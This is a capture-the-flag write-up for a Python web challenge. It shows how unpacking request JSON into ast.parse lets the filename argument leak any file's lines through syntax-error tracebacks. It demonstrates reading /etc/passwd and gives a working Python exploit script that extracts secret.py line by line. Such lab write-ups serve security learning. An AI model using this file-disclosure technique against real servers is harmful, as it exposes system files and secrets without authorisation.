# Online Python Compiler

This is an easy server side challenge

## Overview

We're given a challenge that allows us to edit Python code online. Syntax checks are performed server-side using `ast.parse`, and the source code is passed by unpacking `request.json` into the function call. If an exception is thrown, the traceback will be returned to us.

Our goal is to read the content of `secret.py`

Since the source code is nearly non-existent, the vulnerability clearly lies in how `ast.parse` is called:

```py
ast.parse(**request.json)
```

Let's review the documentation for `ast.parse`:

```py
parse(
    source,
    filename='<unknown>',
    mode='exec',
    *,
    type_comments=False,
    feature_version=None,
    optimize=-1
)
    Parse the source into an AST node.
    Equivalent to compile(source, filename, mode, PyCF_ONLY_AST).
    Pass type_comments=True to get back type comments where the syntax allows.
```

Although we're not able to execute arbitrary code, there's something interesting here:

> Equivalent to `compile(source, filename, mode, PyCF_ONLY_AST)`

`compile` is known to be unsafe if used in a certain way. In fact, we can read files by causing a syntax error. For example:

```py
>>> compile(".", "/etc/passwd", "exec")
Traceback (most recent call last):
  File "<python-input-3>", line 1, in <module>
    compile(".", "/etc/passwd", "exec")
    ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/etc/passwd", line 1
    root:x:0:0:Super User:/root:/bin/bash
    ^
```

To read multiple lines, we can add a newline before the dot, like this:

```py
compile("\n.", "/etc/passwd", "exec")
```

# Final exploit

```py
import requests

URL = "http://localhost:3000"

for x in range(32):
    leak_source = "\n"*x + "."
    response = requests.post(f"{URL}/check", json={
        "source": leak_source,
        "filename": "/app/secret.py"
        })
    leak = response.json()["error"].split("\n")[-4].strip()
    
    if leak == ".":
        break
    
    print(leak)
```